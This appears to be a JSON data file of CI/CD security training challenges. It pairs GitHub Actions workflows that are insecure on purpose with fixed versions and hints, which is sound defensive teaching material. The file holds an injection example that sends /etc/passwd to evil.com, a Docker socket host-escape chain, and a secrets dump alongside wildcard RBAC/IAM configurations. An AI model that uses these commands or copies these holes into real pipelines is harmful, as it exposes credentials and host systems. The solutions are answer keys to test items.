    "vulnerableWorkflow": "name: Deploy\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n  deploy-prod:\r\n    runs-on: ubuntu-latest\r\n    needs: build\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Deploy to production\r\n        run: ./deploy.sh --target prod\r\n",
    "solutionWorkflow": "name: Deploy\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Install dependencies\r\n        run: npm ci\r\n\r\n      - name: Build\r\n        run: npm run build\r\n\r\n  deploy-prod:\r\n    runs-on: ubuntu-latest\r\n    needs: build\r\n    environment: production\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Deploy to production\r\n        run: ./deploy.sh --target prod\r\n",
    "hints": [
      "# Hint 1: What the gate enforces\r\n\r\nAn environment in repository Settings can require reviewers (up to 6 people\r\nor teams), a wait timer, and a deployment-branches policy. The job only\r\nstarts — and only receives the environment's secrets — after those rules\r\npass. Without the `environment:` key, none of that exists.\r\n",
      "# Hint 2: The fix\r\n\r\nAdd `environment: production` to the `deploy-prod` job. Make sure the name\r\nmatches the protected environment in Settings exactly — a typo creates a\r\nbrand-new unprotected environment instead of gating anything.\r\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "docker-digest-pin",
    "title": "Pin the Base",
    "level": "intermediate",
    "topic": "docker",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow builds from a mutable base tag. When the tag moves — rebuild,\ncompromise, or retag — your pipeline builds different bytes with no diff in\nyour repository. Pin the base image to an immutable digest.\n",
    "tags": [
      "docker",
      "supply-chain",
      "pinning"
    ],
    "prerequisites": [
      "docker-running-as-root",
      "unsafe-deps"
    ],
    "objectives": [
      "Explain why mutable base tags change builds without a repository diff",
      "Pin FROM lines to tag at sha256 digest",
      "Refresh digests with imagetools inspect and Dependabot docker updates"
    ],
    "references": [
      {
        "page": "docker",
        "label": "Digest pinning guide"
      }
    ],
    "scenario": "# Scenario: Pin the Base\r\n\r\nYour Dockerfile starts with `FROM node:20-slim`. That tag is mutable: the\r\nmaintainers rebuild it regularly, and anyone who compromises the registry\r\naccount can point it at different bytes. Your pipeline then builds — and\r\nships — code you never reviewed, with no diff in your repository to alert you.\r\n\r\nDigest pinning fixes the name to exact bytes:\r\n`FROM node:20-slim@sha256:2cf0...`. The tag stays for readability; the digest\r\nenforces immutability. Refresh it with\r\n`docker buildx imagetools inspect node:20-slim`, and let Dependabot's docker\r\necosystem propose digest updates on schedule.\r\n\r\n**Your mission:** Pin every `FROM` line in the inline Dockerfile to its digest.\r\n\r\n## Key concepts\r\n- Tags move, digests do not — pin `tag@sha256:digest`\r\n- Refresh via `docker buildx imagetools inspect`, automate via Dependabot\r\n- Signing (next challenge) proves who built it; pinning proves what you built from\r\n",
    "vulnerableWorkflow": "name: Build Docker Image\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Build image\r\n        run: |\r\n          cat <<'EOF' > Dockerfile\r\n          FROM node:20-slim\r\n          WORKDIR /app\r\n          COPY package*.json ./\r\n          RUN npm ci --production\r\n          COPY src/ ./src/\r\n          CMD [\"node\", \"src/index.js\"]\r\n          EOF\r\n          docker build -t myapp:latest .\r\n\r\n      - name: Push image\r\n        run: |\r\n          echo \"Pushing to registry...\"\r\n          docker push myapp:latest\r\n",
    "solutionWorkflow": "name: Build Docker Image\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Build image\r\n        run: |\r\n          cat <<'EOF' > Dockerfile\r\n          # Digest refreshed 2026-09-27 via docker buildx imagetools inspect.\r\n          # Digests rotate on rebuild — refresh on schedule with Dependabot docker updates.\r\n          FROM node:20-slim@sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0\r\n          WORKDIR /app\r\n          COPY package*.json ./\r\n          RUN npm ci --production\r\n          COPY src/ ./src/\r\n          CMD [\"node\", \"src/index.js\"]\r\n          EOF\r\n          docker build -t myapp:latest .\r\n\r\n      - name: Push image\r\n        run: |\r\n          echo \"Pushing to registry...\"\r\n          docker push myapp:latest\r\n",
    "hints": [
      "# Hint 1: What moves under you\r\n\r\n`node:20-slim` today and `node:20-slim` next month can be different images.\r\nLook at the `FROM` line inside the heredoc Dockerfile — it names a mutable\r\ntag with no digest, so nothing binds your build to specific bytes.\r\n",
      "# Hint 2: The fix\r\n\r\nRewrite the line as `FROM node:20-slim@sha256:<digest>`, keeping the tag for\r\nreadability. Get the current digest with\r\n`docker buildx imagetools inspect node:20-slim` and record the refresh date in\r\na comment so the next rotation is not a surprise.\r\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "cosign-sign",
    "title": "Sign the Image",
    "level": "intermediate",
    "topic": "docker",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow builds a pinned base image and pushes it unsigned. Any tag\ncan be overwritten with different bytes, and clusters accept whatever the\ntag points at. Sign the image keylessly so consumers verify before running.\n",
    "tags": [
      "docker",
      "cosign",
      "signing",
      "oidc"
    ],
    "prerequisites": [
      "docker-secrets-in-env",
      "oidc-misconfig"
    ],
    "objectives": [
      "Explain why unsigned tags let registries serve untrusted bytes",
      "Install cosign and sign the pushed image keylessly with OIDC",
      "Verify signatures before deploying images to clusters"
    ],
    "references": [
      {
        "page": "docker",
        "label": "Image signing with cosign guide"
      }
    ],
    "scenario": "# Scenario: Sign the Image\r\n\r\nYour Dockerfile is pinned, your build is reproducible — and then you push the\r\nimage unsigned. The tag is just a mutable pointer: anyone with registry access\r\ncan overwrite it with different bytes, and every cluster pulling the tag runs\r\nwhatever it currently points at.\r\n\r\nKeyless signing with cosign fixes that without managing keys: the workflow's\r\nOIDC identity mints a short-lived certificate, the signature binds the exact\r\nimage digest to your repository, and consumers verify with\r\n`cosign verify` before deploying.\r\n\r\n**Your mission:** Sign the pushed image with keyless cosign.\r\n\r\n## Key concepts\r\n- Pinning proves what you built from; signing proves who built it\r\n- Keyless cosign needs `id-token: write` — no long-lived keys\r\n- Sign digests in production; verify with `cosign verify` before deploy\r\n",
    "vulnerableWorkflow": "name: Build and Push\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n  packages: write\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Build image\r\n        run: |\r\n          cat <<'EOF' > Dockerfile\r\n          FROM node:20-slim@sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0\r\n          WORKDIR /app\r\n          COPY package*.json ./\r\n          RUN npm ci --production\r\n          COPY src/ ./src/\r\n          CMD [\"node\", \"src/index.js\"]\r\n          EOF\r\n          docker build -t ghcr.io/example/myapp:${{ github.sha }} .\r\n\r\n      - name: Push image\r\n        run: docker push ghcr.io/example/myapp:${{ github.sha }}\r\n",
    "solutionWorkflow": "name: Build and Push\r\n\r\non:\r\n  push:\r\n    branches: [main]\r\n\r\npermissions:\r\n  contents: read\r\n  packages: write\r\n  id-token: write\r\n\r\njobs:\r\n  build:\r\n    runs-on: ubuntu-latest\r\n    steps:\r\n      - uses: actions/checkout@v4\r\n\r\n      - name: Build image\r\n        run: |\r\n          cat <<'EOF' > Dockerfile\r\n          FROM node:20-slim@sha256:2cf067cfed83d5ea958367df9f966191a942351a2df77d6f0193e162b5febfc0\r\n          WORKDIR /app\r\n          COPY package*.json ./\r\n          RUN npm ci --production\r\n          COPY src/ ./src/\r\n          CMD [\"node\", \"src/index.js\"]\r\n          EOF\r\n          docker build -t ghcr.io/example/myapp:${{ github.sha }} .\r\n\r\n      - name: Push image\r\n        run: docker push ghcr.io/example/myapp:${{ github.sha }}\r\n\r\n      - name: Install cosign\r\n        uses: sigstore/cosign-installer@v4\r\n\r\n      - name: Sign image\r\n        run: cosign sign --yes ghcr.io/example/myapp:${{ github.sha }}\r\n",
    "hints": [
      "# Hint 1: What is missing\r\n\r\nThe workflow pushes `ghcr.io/example/myapp` but no step signs anything.\r\nSearch for `cosign` — there is no installer, no `cosign sign`, and no\r\n`id-token: write` permission for keyless signing.\r\n",
      "# Hint 2: The fix\r\n\r\nAdd `sigstore/cosign-installer@v4`, grant `id-token: write`, then run\r\n`cosign sign --yes` on the pushed reference after the push step.\r\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "secrets-lifecycle",
    "title": "Secrets Lifecycle",
    "level": "intermediate",
    "topic": "github-actions",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow uses a static deploy token that never expires and dumps the\nwhole secrets context to logs for debugging. Shrink every secret lifetime\nand confine each secret to the single step that needs it.\n",
    "tags": [
      "secrets",
      "lifecycle",
      "rotation"
    ],
    "prerequisites": [
      "secrets-leak",
      "env-dumping"
    ],
    "objectives": [
      "Distinguish long-lived static secrets from short-lived scoped credentials",
      "Confine each secret to the single step that needs it",
      "Remove mass-exposure patterns like whole-context dumps from logs"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Secrets lifecycle guide"
      }
    ],
    "scenario": "# Scenario: Secrets Lifecycle\n\nEvery secret has a lifetime: it is created, distributed, used, and — if you\nare lucky — rotated and revoked. This workflow fails the lifecycle at both\nends. The deploy token is a static string baked into the YAML, so it works\nforever for anyone who reads the repo. And a debugging step serializes the\nentire secrets context with `toJSON(secrets)`, exposing every secret's whole\nlifetime in a single log line.\n\nStatic credentials never expire on their own, and logs live as long as the\nrepository. Prefer short-lived credentials (OIDC), confine each secret to the\none step that needs it, and rotate anything that was ever exposed.\n\n**Your mission:** Remove the static token and the secrets dump. Reference the\ndeploy token from secrets, scoped to the deploy step only.\n\n## Key concepts\n- Static secrets work until manually revoked — assume they already leaked\n- `toJSON(secrets)` exposes every secret at once; reference single secrets instead\n- Scope secrets per step, mask computed values, rotate on a schedule\n",
    "vulnerableWorkflow": "name: Deploy with Debug\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Debug secrets\n        run: |\n          echo \"Checking available secrets...\"\n          echo \"${{ toJSON(secrets) }}\"\n\n      - name: Deploy\n        env:\n          DEPLOY_TOKEN: FILL_ME_FROM_SECRETS\n        run: ./deploy.sh\n",
    "solutionWorkflow": "name: Deploy with Debug\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy\n        env:\n          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n        run: ./deploy.sh\n",
    "hints": [
      "# Hint 1: Two lifetime failures\n\n`DEPLOY_TOKEN: FILL_ME_FROM_SECRETS` in `env:` is a static credential — it works forever for anyone with repo read access. And\n`echo \"${{ toJSON(secrets) }}\"` prints every secret at once, so one log line\nexposes all of them for as long as logs are kept.\n",
      "# Hint 2: The fix\n\nDelete the debug step entirely, then replace the static value with\n`DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}` on the deploy step only. For the\nlong term, move to short-lived OIDC credentials and rotate the exposed token\nnow that it lived in logs.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "sarif-alerting",
    "title": "Silent Scanner",
    "level": "intermediate",
    "topic": "monitoring",
    "points": 150,
    "estimatedTime": "15m",
    "description": "This workflow runs a Trivy vulnerability scan but never uploads the SARIF,\nso findings never become code-scanning alerts. The run stays green while\nvulnerabilities sit unread. Surface the results as alerts.\n",
    "tags": [
      "sarif",
      "scanning",
      "alerting"
    ],
    "prerequisites": [
      "mon-no-build-status"
    ],
    "objectives": [
      "Explain why scan output without SARIF upload produces no alerts",
      "Upload results with upload-sarif and security-events write",
      "Verify findings appear as code-scanning alerts"
    ],
    "references": [
      {
        "page": "monitoring",
        "label": "Code scanning alerts guide"
      }
    ],
    "scenario": "# Scenario: Silent Scanner\n\nYour pipeline runs a Trivy vulnerability scan on every push. The scan works —\nbut the SARIF file it produces is never uploaded anywhere. No upload means no\ncode-scanning alerts: the Security tab stays empty, nobody is notified, and\nthe run badge stays green while known vulnerabilities sit in your\ndependencies.\n\nThe upload step is what turns scanner output into alerts, and it needs the\n`security-events: write` permission — without it the upload is rejected with\n`Resource not accessible by integration`, green run and all.\n\n**Your mission:** Upload the SARIF results with the alerting permission so\nfindings surface where humans look.\n\n## Key concepts\n- Scanner output alone creates zero alerts — only an upload does\n- `github/codeql-action/upload-sarif` needs `sarif_file` plus `security-events: write`\n- Green runs mean nothing if results never reach the Security tab\n",
    "vulnerableWorkflow": "name: Security Scan\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n\njobs:\n  scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run Trivy scan\n        run: trivy fs --format sarif --output results.sarif .\n\n      - name: Run tests\n        run: npm test\n",
    "solutionWorkflow": "name: Security Scan\n\non:\n  push:\n    branches: [main]\n\npermissions:\n  contents: read\n  security-events: write\n\njobs:\n  scan:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Run Trivy scan\n        run: trivy fs --format sarif --output results.sarif .\n\n      - name: Upload SARIF\n        uses: github/codeql-action/upload-sarif@v4\n        with:\n          sarif_file: results.sarif\n\n      - name: Run tests\n        run: npm test\n",
    "hints": [
      "# Hint 1: Where results go to die\n\nThe Trivy step writes `results.sarif` to the workspace and nothing ever reads\nit. Search the workflow for `upload-sarif` — there is no upload step, so GitHub\nnever learns the findings exist.\n",
      "# Hint 2: The fix\n\nAdd `github/codeql-action/upload-sarif@v4` with `sarif_file: results.sarif`\nafter the scan, and grant `security-events: write` — without that permission\nthe upload is rejected and the silence continues.\n"
    ],
    "hintsPenalty": 30
  },
  {
    "id": "reusable-workflow-injection",
    "title": "Reusable Workflow Injection",
    "level": "advanced",
    "topic": "github-actions",
    "points": 200,
    "estimatedTime": "25m",
    "description": "This reusable workflow accepts inputs from caller workflows and passes\nthem directly into shell commands via expression interpolation. An attacker\ncan craft a malicious caller workflow to inject arbitrary code.\nSanitize all inputs before using them in run steps.\n",
    "tags": [
      "injection",
      "reusable-workflows",
      "inputs"
    ],
    "prerequisites": [
      "script-injection"
    ],
    "objectives": [
      "Sanitize reusable workflow inputs before shell use",
      "Apply env indirection to inputs like any untrusted context"
    ],
    "references": [
      {
        "page": "github-actions",
        "label": "Script injection guide"
      }
    ],
    "scenario": "# Scenario: Reusable Workflow Injection\n\nYour team created a reusable workflow for shared CI/CD tasks. It accepts `inputs` from caller workflows and uses them in `run:` steps via `${{ inputs.name }}` interpolation.\n\nThe problem: GitHub Actions substitutes `${{ inputs.* }}` BEFORE bash sees the command. If a caller passes a malicious value like:\n\n```\nname: \"test\"; curl https://evil.com/steal -d @/etc/passwd\"\n```\n\nIt becomes arbitrary code execution. Any repository in your org that calls this reusable workflow can exploit it.\n\n**Your mission:** Refactor the reusable workflow to pass inputs through environment variables instead of direct expression interpolation.\n\n## Key concepts\n- `${{ inputs.x }}` is substituted pre-shell — injection risk\n- `env: { VAR: ${{ inputs.x }} }` followed by `$VAR` in shell — safe\n- Environment variables are not subject to shell injection\n",
    "vulnerableWorkflow": "name: Reusable Deploy\n\non:\n  workflow_call:\n    inputs:\n      environment:\n        required: true\n        type: string\n      version:\n        required: false\n        type: string\n        default: 'latest'\n    secrets:\n      AWS_ACCESS_KEY_ID:\n        required: true\n      AWS_SECRET_ACCESS_KEY:\n        required: true\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy to environment\n        run: |\n          echo \"Deploying version ${{ inputs.version }} to ${{ inputs.environment }}\"\n          echo \"Running deploy script for ${{ inputs.environment }}\"\n\n      - name: Notify\n        run: |\n          echo \"Deployment of ${{ inputs.version }} to ${{ inputs.environment }} complete\"\n",
    "solutionWorkflow": "name: Reusable Deploy\n\non:\n  workflow_call:\n    inputs:\n      environment:\n        required: true\n        type: string\n      version:\n        required: false\n        type: string\n        default: 'latest'\n    secrets:\n      AWS_ACCESS_KEY_ID:\n        required: true\n      AWS_SECRET_ACCESS_KEY:\n        required: true\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    env:\n      DEPLOY_ENV: ${{ inputs.environment }}\n      DEPLOY_VERSION: ${{ inputs.version }}\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Deploy to environment\n        run: |\n          echo \"Deploying version $DEPLOY_VERSION to $DEPLOY_ENV\"\n          echo \"Running deploy script for $DEPLOY_ENV\"\n\n      - name: Notify\n        run: |\n          echo \"Deployment of $DEPLOY_VERSION to $DEPLOY_ENV complete\"\n",
    "hints": [
      "# Hint 1: The injection mechanism\n\nWhen you write `run: echo \"${{ inputs.name }}\"`, GitHub replaces the expression with the actual value BEFORE bash parses the command. If the value contains shell metacharacters (`;`, `|`, `$()`), they execute as code.\n",
      "# Hint 2: The safe pattern\n\nPass inputs through an `env:` block:\n```yaml\nenv:\n  INPUT_NAME: ${{ inputs.name }}\nrun: echo \"$INPUT_NAME\"\n```\nEnvironment variables are not substituted by the shell parser — they're literal strings.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "docker-socket-mount",
    "title": "Docker Socket Escape",
    "level": "advanced",
    "topic": "docker",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow mounts the Docker socket into a build container for\nDocker-in-Docker builds. This gives the container full control over\nthe host's Docker daemon — effectively root access.\nUse remote builders or kaniko instead.\n",
    "tags": [
      "docker",
      "socket",
      "privilege-escalation"
    ],
    "prerequisites": [
      "docker-running-as-root"
    ],
    "objectives": [
      "Explain why daemon control equals host root",
      "Build inside remote builders or unprivileged tools"
    ],
    "references": [
      {
        "page": "docker",
        "label": "Container escape guide"
      }
    ],
    "scenario": "# Scenario: Docker Socket Escape\n\nYour CI pipeline uses Docker-in-Docker (DinD) by mounting `/var/run/docker.sock` into the build container. This lets the build container create new containers on the host.\n\nThe Docker socket is equivalent to root access. A compromised build container can:\n1. Create a privileged container that mounts the host filesystem\n2. Extract all secrets from other containers\n3. Install persistent backdoors on the host\n4. Pivot to other machines on the network\n\n**Your mission:** Remove the Docker socket mount. Use a remote Docker builder, kaniko, or buildx with a remote builder instead.\n\n## Attack chain\n```\nContainer with docker.sock → docker run -v /:/host alpine → chroot /host → full host compromise\n```\n",
    "vulnerableWorkflow": "name: Build with DinD\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    container:\n      image: docker:24-dind\n      volumes:\n        - /var/run/docker.sock:/var/run/docker.sock\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Build image\n        run: |\n          docker build -t myapp:latest .\n\n      - name: Push image\n        run: |\n          docker push myapp:latest\n",
    "solutionWorkflow": "name: Build with Buildx\n\non:\n  push:\n    branches: [main]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up Docker Buildx\n        uses: docker/setup-buildx-action@v3\n\n      - name: Build and push\n        uses: docker/build-push-action@v5\n        with:\n          context: .\n          push: true\n          tags: myapp:latest\n          cache-from: type=gha\n          cache-to: type=gha,mode=max\n",
    "hints": [
      "# Hint 1: Why docker.sock is dangerous\n\nMounting `/var/run/docker.sock` gives the container full control over the Docker daemon. It can create containers with `-v /:/host` to mount the entire host filesystem, effectively gaining root access.\n",
      "# Hint 2: Safer alternatives\n\nUse `docker buildx create --driver remote` for remote builders, or use Google's kaniko for building images without Docker daemon access. GitHub Actions also offers `docker/build-push-action` with BuildKit remote builders.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "k8s-rbac-escalation",
    "title": "RBAC Privilege Escalation",
    "level": "advanced",
    "topic": "kubernetes",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow applies RBAC rules with wildcard verbs and resources.\nAny pod with the bound ServiceAccount can read secrets, create pods,\nand escalate to cluster-admin. Apply least-privilege RBAC.\n",
    "tags": [
      "kubernetes",
      "rbac",
      "privilege-escalation"
    ],
    "prerequisites": [
      "permissions-overkill"
    ],
    "objectives": [
      "Remove wildcard verbs and resources from bindings",
      "Scope roles to namespaces that need them"
    ],
    "references": [
      {
        "page": "kubernetes",
        "label": "RBAC hardening guide"
      }
    ],
    "scenario": "# Scenario: RBAC Privilege Escalation\n\nYour CI pipeline applies a ClusterRole and ClusterRoleBinding with wildcard permissions (`verbs: [\"*\"]`, `resources: [\"*\"]`). This was done for \"convenience\" so the app wouldn't hit permission errors.\n\nThe problem: any pod that uses the bound ServiceAccount can:\n- Read all Secrets in the cluster (including credentials)\n- Create new pods that mount host filesystems\n- Create new ClusterRoleBindings to grant itself admin access\n- Essentially become cluster-admin\n\n**Your mission:** Replace wildcard permissions with specific, least-privilege rules. Only grant the exact verbs and resources the application needs.\n\n## The escalation chain\n```\nWildcard ClusterRole → read Secrets → mount host → full cluster compromise\n```\n",
    "vulnerableWorkflow": "name: Setup RBAC\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply RBAC\n        run: |\n          cat <<'EOF' > rbac.yml\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: ClusterRole\n          metadata:\n            name: app-role\n          rules:\n            - apiGroups: [\"\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n            - apiGroups: [\"apps\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n            - apiGroups: [\"batch\"]\n              resources: [\"*\"]\n              verbs: [\"*\"]\n          ---\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: ClusterRoleBinding\n          metadata:\n            name: app-role-binding\n          subjects:\n            - kind: ServiceAccount\n              name: app-sa\n              namespace: default\n          roleRef:\n            kind: ClusterRole\n            name: app-role\n            apiGroup: rbac.authorization.k8s.io\n          EOF\n          kubectl apply -f rbac.yml\n",
    "solutionWorkflow": "name: Setup RBAC\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Apply RBAC\n        run: |\n          cat <<'EOF' > rbac.yml\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: Role\n          metadata:\n            name: app-role\n            namespace: default\n          rules:\n            - apiGroups: [\"\"]\n              resources: [\"pods\", \"services\", \"configmaps\"]\n              verbs: [\"get\", \"list\", \"watch\"]\n            - apiGroups: [\"apps\"]\n              resources: [\"deployments\"]\n              verbs: [\"get\", \"list\", \"watch\"]\n          ---\n          apiVersion: rbac.authorization.k8s.io/v1\n          kind: RoleBinding\n          metadata:\n            name: app-role-binding\n            namespace: default\n          subjects:\n            - kind: ServiceAccount\n              name: app-sa\n              namespace: default\n          roleRef:\n            kind: Role\n            name: app-role\n            apiGroup: rbac.authorization.k8s.io\n          EOF\n          kubectl apply -f rbac.yml\n",
    "hints": [
      "# Hint 1: Why wildcards are dangerous\n\n`verbs: [\"*\"]` means ALL operations (get, list, watch, create, update, patch, delete). `resources: [\"*\"]` means ALL resource types including Secrets, Pods, and RoleBindings. Together, they grant full cluster admin access.\n",
      "# Hint 2: The fix\n\nReplace `resources: [\"*\"]` with specific resources like `[\"pods\", \"services\", \"configmaps\"]`. Replace `verbs: [\"*\"]` with only needed verbs like `[\"get\", \"list\", \"watch\"]`. Never grant `secrets` access unless absolutely required.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "tf-iam-wildcard",
    "title": "IAM Wildcard Policies",
    "level": "advanced",
    "topic": "terraform",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow creates IAM policies with wildcard actions and resources.\nAny entity with this policy can do anything to any AWS resource.\nApply least-privilege IAM with specific actions and resource ARNs.\n",
    "tags": [
      "terraform",
      "aws",
      "iam",
      "least-privilege"
    ],
    "prerequisites": [
      "permissions-overkill"
    ],
    "objectives": [
      "Replace wildcard actions with specific API calls",
      "Scope resources to exact ARNs"
    ],
    "references": [
      {
        "page": "terraform",
        "label": "IAM least privilege guide"
      }
    ],
    "scenario": "# Scenario: IAM Wildcard Policies\n\nYour Terraform creates an IAM policy with `\"Action\": \"*\"` and `\"Resource\": \"*\"`. This grants the entity (user, role, or service) full access to every AWS service and resource.\n\nThis is equivalent to giving someone the AWS root credentials. If the credentials leak (via compromised CI, leaked env var, or social engineering), the attacker can:\n- Access all S3 buckets\n- Modify any infrastructure\n- Create backdoor IAM users\n- Exfiltrate all data\n\n**Your mission:** Replace wildcards with specific actions and resource ARNs. Only grant what the application actually needs.\n\n## Example of least-privilege\nInstead of `\"Action\": \"*\"`, use `\"Action\": [\"s3:GetObject\", \"s3:PutObject\"]`\nInstead of `\"Resource\": \"*\"`, use `\"Resource\": \"arn:aws:s3:::my-bucket/*\"`\n",
    "vulnerableWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > iam.tf\n          resource \"aws_iam_policy\" \"app_policy\" {\n            name        = \"app-full-access\"\n            description = \"Full access for application\"\n\n            policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect   = \"Allow\"\n                  Action   = \"*\"\n                  Resource = \"*\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role\" \"app_role\" {\n            name = \"app-role\"\n\n            assume_role_policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Principal = {\n                    Service = \"ec2.amazonaws.com\"\n                  }\n                  Action = \"sts:AssumeRole\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role_policy_attachment\" \"app\" {\n            role       = aws_iam_role.app_role.name\n            policy_arn = aws_iam_policy.app_policy.arn\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "solutionWorkflow": "name: Terraform Apply\n\non:\n  push:\n    branches: [main]\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Setup Terraform\n        uses: hashicorp/setup-terraform@v3\n\n      - name: Init\n        run: terraform init\n\n      - name: Apply\n        run: |\n          cat <<'EOF' > iam.tf\n          resource \"aws_iam_policy\" \"app_policy\" {\n            name        = \"app-limited-access\"\n            description = \"Limited access for application\"\n\n            policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Action = [\n                    \"s3:GetObject\",\n                    \"s3:PutObject\",\n                    \"s3:ListBucket\"\n                  ]\n                  Resource = [\n                    \"arn:aws:s3:::myapp-bucket\",\n                    \"arn:aws:s3:::myapp-bucket/*\"\n                  ]\n                },\n                {\n                  Effect = \"Allow\"\n                  Action = [\n                    \"logs:CreateLogGroup\",\n                    \"logs:CreateLogStream\",\n                    \"logs:PutLogEvents\"\n                  ]\n                  Resource = \"arn:aws:logs:*:*:*\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role\" \"app_role\" {\n            name = \"app-role\"\n\n            assume_role_policy = jsonencode({\n              Version = \"2012-10-17\"\n              Statement = [\n                {\n                  Effect = \"Allow\"\n                  Principal = {\n                    Service = \"ec2.amazonaws.com\"\n                  }\n                  Action = \"sts:AssumeRole\"\n                }\n              ]\n            })\n          }\n\n          resource \"aws_iam_role_policy_attachment\" \"app\" {\n            role       = aws_iam_role.app_role.name\n            policy_arn = aws_iam_policy.app_policy.arn\n          }\n          EOF\n          terraform init\n          terraform apply -auto-approve\n",
    "hints": [
      "# Hint 1: Why wildcards are catastrophic\n\n`\"Action\": \"*\"` means the entity can call ANY AWS API — create users, delete databases, access any bucket. `\"Resource\": \"*\"` means it applies to EVERYTHING. Together, they're equivalent to root access.\n",
      "# Hint 2: The fix\n\nReplace `\"Action\": \"*\"` with specific actions your app needs (e.g., `[\"s3:GetObject\", \"s3:PutObject\"]`). Replace `\"Resource\": \"*\"` with specific ARNs (e.g., `\"arn:aws:s3:::my-bucket/*\"`). Use AWS IAM Access Analyzer to identify unused permissions.\n"
    ],
    "hintsPenalty": 50
  },
  {
    "id": "mon-log-secrets",
    "title": "Secrets in CI Logs",
    "level": "advanced",
    "topic": "monitoring",
    "points": 200,
    "estimatedTime": "20m",
    "description": "This workflow logs sensitive data — tokens, passwords, and secrets — to CI\nlogs that persist in storage. Anyone with log access can extract credentials.\nUse secret masking and filter sensitive output.\n",
    "tags": [
      "monitoring",
      "logs",
      "secrets",
      "masking"
    ],
    "prerequisites": [
      "secrets-leak"
    ],
    "objectives": [
      "Mask secrets before they reach logs",
      "Filter sensitive fields from structured output"
    ],
    "references": [
      {
        "page": "monitoring",
        "label": "Log hygiene guide"
      }
    ],
